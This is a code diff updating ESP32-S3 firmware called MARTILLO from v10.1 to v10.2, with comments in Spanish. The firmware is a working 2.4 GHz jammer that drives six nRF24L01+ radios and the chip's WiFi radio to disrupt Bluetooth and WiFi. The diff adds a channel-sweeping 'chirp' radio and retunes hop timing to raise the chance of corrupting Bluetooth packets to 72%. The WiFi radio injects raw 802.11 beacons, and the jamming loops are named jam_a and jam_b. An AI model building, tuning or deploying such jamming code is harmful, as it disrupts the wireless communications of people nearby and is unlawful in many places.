@@ -1,25 +1,40 @@
 /*
- * MARTILLO v10.1 — ESP32-S3 N16R8 — ESP-IDF 6.0.3
+ * MARTILLO v10.2 — ESP32-S3 N16R8 — ESP-IDF 6.0.3
  * 6x nRF24L01+ PA/LNA + radio WiFi del S3 (bloque 802.11 de 20 MHz)
  *
  * SPI2 (SCK 12, MOSI 11, MISO 13): NRF1(CE 4 CS 10) NRF2(CE 5 CS 9) NRF3(CE 6 CS 14)
  * SPI3 (SCK 18, MOSI 8,  MISO 7):  NRF4(CE 1 CS 21) NRF5(CE 15 CS 16) NRF6(CE 17 CS 38)
  * WS2812 -> GPIO 48
  *
- * ===== CORRECCIONES v10.1 =====
- * 1) CE conmutado POR SALTO + re-arme de TX_REUSE. En v10.0 CE quedaba alto
- *    para siempre con TX_REUSE puesto: el sintetizador no volvia a idle y el
- *    RF_CH escrito podia no aplicarse -> 6 radios clavados, AFH los esquiva.
- *    Ahora: ce_lo -> RF_CH -> TX_REUSE=1 -> ce_hi -> dwell. Coste ~3us (0.7%).
- * 2) WiFi INLINE en el lazo de jam_b. v10.0 lo puso en un task a prio 22 y el
- *    driver WiFi (prio 23) dejaba sin CPU a jam_b y al monitor. Ahora no hay
- *    task competidora: el frame se inyecta dentro del mismo lazo.
- * 3) AP en vez de STA para esp_wifi_80211_tx (el AP es dueño del beacon).
- * 4) Settle de 2 ms tras PWR_UP antes de subir CE (datasheet: 1.5 ms).
- * 5) AUTOTEST de RF al arranque con RPD cruzado: te dice en el monitor si
- *    algun modulo esta sordo, antes de que confies en el barrido.
- * 6) MODO 1 = CW fijo en 6 canales separados. Si con esto no calla un audifono
- *    a 10 cm, el problema es alimentacion/antena, no firmware.
+ * ===== ARQUITECTURA =====
+ * Dos mecanismos complementarios, no uno:
+ *
+ *   A) 5 radios MARTILLO: basura GFSK a 2 Mbps (~2 MHz), dwell 300us con
+ *      jitter de +-120us, orden barajado, payload LFSR. Un impacto de 300us
+ *      corrompe cualquier trama BT que caiga dentro; contra un DH5 (3125us) la
+ *      probabilidad de impacto por paquete es (3125+300)/4740 = 72%.
+ *
+ *   B) 1 radio CHIRP: dwell 60us, sin lock de PLL. No mata paquetes: barre los
+ *      79 canales en ~4.7 ms dejando un piso de ruido elevado en todo el
+ *      espectro. Es lo mas parecido a un SDR que da este hardware.
+ *
+ *   C) Radio WiFi del S3: beacons 802.11 crudos de 168 B a 1 Mbps (preamble
+ *      largo) sobre 20 MHz. Rota 1 -> 6 -> 11 cada 150 ms.
+ *
+ * ===== POR QUE DWELL CORTO Y NO LARGO =====
+ * El duty por canal es 1/N y NO depende del dwell: revisit = N*d, duty = 1/N.
+ * Pero la probabilidad de impacto en un paquete de duracion T es (T+d)/(N*d),
+ * que DECRECE con d. Con d=450 y N=13 era 60%; con d=300 y N=16 es 72%.
+ * Ademas un impacto corto ya basta: el CRC del paquete BT se cae igual.
+ *
+ * ===== FIXES =====
+ * v10.2: CW_FIJO con __attribute__((unused)) (rompia el build con MODO 0).
+ *        Radio chirp + dwell por radio. Duty de martillo 7.5% -> 6.2% por
+ *        canal pero 72% de muerte por paquete contra 60% antes.
+ * v10.1: CE conmutado por salto + re-arme de TX_REUSE (sin esto el RF_CH
+ *        escrito podia no aplicarse y los radios se quedaban clavados).
+ *        WiFi inline en el lazo. AP en vez de STA. Settle de PWR_UP.
+ *        Autotest RPD al arranque.
  */
 
 #include <stdio.h>
@@ -44,26 +59,27 @@
 static const char *TAG = "MART";
 
 /* ===================== CONFIG ===================== */
-#define MODO             0        /* 0 = carpa + WiFi   1 = CW fijo (prueba) */
+#define MODO             0        /* 0 = martillo+chirp+WiFi   1 = CW fijo (prueba) */
 #define CH_LO            2
 #define CH_HI            80
 #define NUM_CANALES      (CH_HI - CH_LO + 1)
 #define NUM_RADIOS       6
 
-#define DWELL_US         450u
-#define JITTER_US        150u
+#define N_CHIRP          1        /* cuantos radios al chirp (0..2) */
+#define DWELL_US         300u     /* martillo */
+#define JITTER_US        120u
+#define CHIRP_US         60u      /* chirp: por debajo del lock de 130us */
 #define REFRESCO_HOPS    96u
 
 #define CON_WIFI         1
 #define WIFI_MS_POR_CANAL 150
-#define WIFI_CADA_HOPS   24       /* inyecta 1 frame 802.11 cada 24 saltos */
+#define WIFI_CADA_HOPS   20
 
 #define SPI_HZ           (16 * 1000 * 1000)
 #define CPU_MHZ          240u
 #define CEDE_MS          2000
 
-/* canales del modo prueba: bien separados */
-static const uint8_t CW_FIJO[6] = {2, 16, 30, 44, 58, 72};
+static const uint8_t CW_FIJO[6] __attribute__((unused)) = {2, 16, 30, 44, 58, 72};
 
 /* ===================== tiempo / RNG ===================== */
 static inline __attribute__((always_inline)) uint32_t cyc(void) {
@@ -118,6 +134,8 @@ typedef struct {
     spi_dev_t *hw;
     uint8_t  seq[24];
     uint8_t  len, idx, align;
+    uint16_t dwell;
+    bool chirp;
     volatile uint32_t hops;
     bool bang_ok, bang_sucio, vivo;
 } radio_t;
@@ -357,11 +375,20 @@ static void autotest_rf(void) {
 }
 
 /* ===================== reparto ===================== */
+static void mezclar(uint8_t *s, int n) {
+    for (int j = n - 1; j > 0; j--) {
+        int q = (int)(rnd() % (uint32_t)(j + 1));
+        uint8_t t = s[j]; s[j] = s[q]; s[q] = t;
+    }
+}
+
 static void repartir(void) {
     int vivos[NUM_RADIOS], nv = 0;
     for (int i = 0; i < NUM_RADIOS; i++) if (radios[i].vivo) vivos[nv++] = i;
     if (!nv) return;
-    for (int i = 0; i < NUM_RADIOS; i++) radios[i].len = 0;
+    for (int i = 0; i < NUM_RADIOS; i++) {
+        radios[i].len = 0; radios[i].chirp = false; radios[i].dwell = DWELL_US;
+    }
 
 #if MODO == 1
     for (int k = 0; k < nv; k++) {
@@ -369,23 +396,37 @@ static void repartir(void) {
         r->seq[0] = CW_FIJO[k % 6];
         r->len = 1;
         nrf_write_reg(r, NRF_RF_CH, r->seq[0]);
+        nrf_write_reg(r, NRF_RF_SETUP, RF_SETUP_CW);
     }
     ESP_LOGI(TAG, "MODO PRUEBA: %d radios en CW fijo", nv);
 #else
+    int nch = N_CHIRP;
+    if (nch > nv) nch = nv;
+    int nsw = nv - nch;
+    if (nsw < 1) { nsw = 1; nch = nv - 1; }
+
+    /* chirpers: los ultimos, barren TODO el espectro rapido */
+    for (int k = 0; k < nch; k++) {
+        radio_t *r = &radios[vivos[nv - 1 - k]];
+        r->chirp = true;
+        r->dwell = CHIRP_US;
+        int c = 0;
+        for (int ch = CH_LO; ch <= CH_HI && c < (int)sizeof(r->seq); ch++)
+            r->seq[c++] = (uint8_t)ch;
+        r->len = (uint8_t)c;
+        mezclar(r->seq, r->len);
+    }
+
+    /* martillos: slices disjuntos del resto */
     int k = 0;
-    for (int c = CH_LO; c <= CH_HI; c++) {
-        radio_t *r = &radios[vivos[k % nv]];
-        if (r->len < sizeof(r->seq)) r->seq[r->len++] = (uint8_t)c;
+    for (int ch = CH_LO; ch <= CH_HI; ch++) {
+        radio_t *r = &radios[vivos[k % nsw]];
+        if (r->len < sizeof(r->seq)) r->seq[r->len++] = (uint8_t)ch;
         k++;
     }
-    for (int i = 0; i < nv; i++) {
-        radio_t *r = &radios[vivos[i]];
-        for (int j = r->len - 1; j > 0; j--) {
-            int q = (int)(rnd() % (uint32_t)(j + 1));
-            uint8_t t = r->seq[j]; r->seq[j] = r->seq[q]; r->seq[q] = t;
-        }
-    }
-    ESP_LOGI(TAG, "Reparto: %d canales en %d radios", NUM_CANALES, nv);
+    for (int i = 0; i < nsw; i++) mezclar(radios[vivos[i]].seq, radios[vivos[i]].len);
+
+    ESP_LOGI(TAG, "Reparto: %d martillos / %d chirp / %d canales", nsw, nch, NUM_CANALES);
 #endif
 }
 
@@ -396,20 +437,21 @@ static inline IRAM_ATTR void hop(radio_t *r) {
     if (r->idx >= r->len) r->idx = 0;
     uint8_t ch = r->seq[r->idx];
 
-    ce_lo(r);                                     /* FIX: fuerza re-aplicar canal */
+    ce_lo(r);
     if (r->bang_ok) bang_write(r, CMD_W_REGISTER | NRF_RF_CH, ch);
     else            nrf_write_reg(r, NRF_RF_CH, ch);
-    nrf_write_reg(r, NRF_FIFO_STATUS, TX_REUSE);  /* FIX: CE bajo limpia TX_REUSE */
+    nrf_write_reg(r, NRF_FIFO_STATUS, TX_REUSE);   /* CE bajo limpia TX_REUSE */
     ce_hi(r);
 
     r->hops++;
     if (!(r->hops % REFRESCO_HOPS)) payload_fresco(r);
 }
 
-static inline IRAM_ATTR uint32_t dwell_jit(void) {
+static inline IRAM_ATTR uint32_t dwell_jit(radio_t *r) {
+    if (r->chirp) return (uint32_t)r->dwell * CPU_MHZ;
     int32_t j = (int32_t)(rnd() % (2u * JITTER_US + 1u)) - (int32_t)JITTER_US;
-    int32_t d = (int32_t)DWELL_US + j;
-    if (d < 220) d = 220;
+    int32_t d = (int32_t)r->dwell + j;
+    if (d < 200) d = 200;
     return (uint32_t)d * CPU_MHZ;
 }
 
@@ -473,12 +515,11 @@ static bool wifi_arrancar(void) {
     esp_wifi_set_channel(WIFI_CANALES[0], WIFI_SECOND_CHAN_NONE);
 
     beacon_build();
-    ESP_LOGI(TAG, "WiFi TX (AP) listo: beacon %d B, rotando 1/6/11 cada %d ms",
+    ESP_LOGI(TAG, "WiFi TX (AP): beacon %d B, rotando 1/6/11 cada %d ms",
              beacon_len, WIFI_MS_POR_CANAL);
     return true;
 }
 
-/* llamada desde el lazo de jam_b: no hay task competidora */
 static inline void wifi_pulso(void) {
     static int idx = 0;
     static int64_t t_canal = 0;
@@ -491,10 +532,12 @@ static inline void wifi_pulso(void) {
         esp_wifi_set_channel(WIFI_CANALES[idx], WIFI_SECOND_CHAN_NONE);
     }
     esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, beacon, beacon_len, true);
-    if (e != ESP_OK && (g_wifi_err % 200) == 0)
-        ESP_LOGW(TAG, "80211_tx: %s (err #%lu)", esp_err_to_name(e),
-                 (unsigned long)g_wifi_err);
-    if (e != ESP_OK) g_wifi_err++;
+    if (e != ESP_OK) {
+        if ((g_wifi_err % 200) == 0)
+            ESP_LOGW(TAG, "80211_tx: %s (err #%lu)", esp_err_to_name(e),
+                     (unsigned long)g_wifi_err);
+        g_wifi_err++;
+    }
 }
 #endif
 
@@ -509,9 +552,7 @@ static void stats_y_led(uint32_t *prev, int64_t *tp, uint32_t *cont, bool wifi) 
     }
     uint32_t hz = (uint32_t)((uint64_t)sum * 1000000ull / (uint64_t)(n - *tp));
     *tp = n;
-    ESP_LOGI(TAG, "vivos=%d hops/s=%lu (%.1f/radio) revisita=%.2f ms%s",
-             g_vivos, (unsigned long)hz, g_vivos ? (double)hz / g_vivos : 0.0,
-             hz ? 1000.0 * g_vivos / (double)hz : 0.0,
+    ESP_LOGI(TAG, "vivos=%d hops/s=%lu%s", g_vivos, (unsigned long)hz,
              wifi ? " +WiFi" : "");
 #if CON_WIFI
     if (wifi && g_wifi_err) {
@@ -523,31 +564,35 @@ static void stats_y_led(uint32_t *prev, int64_t *tp, uint32_t *cont, bool wifi) 
     *cont = 0;
 }
 
-static void jam_a(void *arg) {
+static void jam_a(void *arg) {          /* core 1: radios 0-2 */
     uint32_t prev[NUM_RADIOS] = {0};
-    int64_t t = esp_timer_get_time(), tp = t;
+    int64_t tp = esp_timer_get_time();
     uint32_t cont = 0;
     for (;;) {
         uint32_t c0 = cyc();
         hop(&radios[0]); hop(&radios[1]); hop(&radios[2]);
-        uint32_t d = dwell_jit();
+        uint32_t d = dwell_jit(&radios[1]);
         while (cyc() - c0 < d) { }
         if (++cont >= (CEDE_MS * 1000u) / DWELL_US) stats_y_led(prev, &tp, &cont, false);
     }
 }
 
-static void jam_b(void *arg) {
+static void jam_b(void *arg) {          /* core 0: radios 3-5 + WiFi */
     uint32_t prev[NUM_RADIOS] = {0};
-    int64_t t = esp_timer_get_time(), tp = t;
+    int64_t tp = esp_timer_get_time();
     uint32_t cont = 0;
     for (;;) {
         uint32_t c0 = cyc();
-        hop(&radios[3]); hop(&radios[4]); hop(&radios[5]);
+        hop(&radios[3]); hop(&radios[4]);
+        /* el chirp (si esta en este bus) da varios saltos por vuelta */
+        int rep = 1;
+        if (radios[5].chirp) rep = (int)(DWELL_US / CHIRP_US);
+        for (int k = 0; k < rep; k++) hop(&radios[5]);
 #if CON_WIFI
         static uint32_t wc = 0;
         if (++wc >= WIFI_CADA_HOPS) { wc = 0; wifi_pulso(); }
 #endif
-        uint32_t d = dwell_jit();
+        uint32_t d = dwell_jit(&radios[3]);
         while (cyc() - c0 < d) { }
         if (++cont >= (CEDE_MS * 1000u) / DWELL_US) stats_y_led(prev, &tp, &cont, true);
     }
@@ -599,9 +644,9 @@ void app_main(void) {
 #endif
 
     led_set(0, 40, 0);
-    ESP_LOGI(TAG, "MARTILLO v10.1 · %d/6 · MODO=%d · dwell=%u+/-%u · WiFi=%s",
+    ESP_LOGI(TAG, "MARTILLO v10.2 · %d/6 · MODO=%d · martillo=%u+/-%u chirp=%u · WiFi=%s",
              act, MODO, (unsigned)DWELL_US, (unsigned)JITTER_US,
-             g_wifi_ok ? "ON" : "OFF");
+             (unsigned)CHIRP_US, g_wifi_ok ? "ON" : "OFF");
 
     xTaskCreatePinnedToCore(jam_a, "ja", 4096, NULL, configMAX_PRIORITIES - 1, NULL, 1);
     xTaskCreatePinnedToCore(jam_b, "jb", 4096, NULL, configMAX_PRIORITIES - 1, NULL, 0);
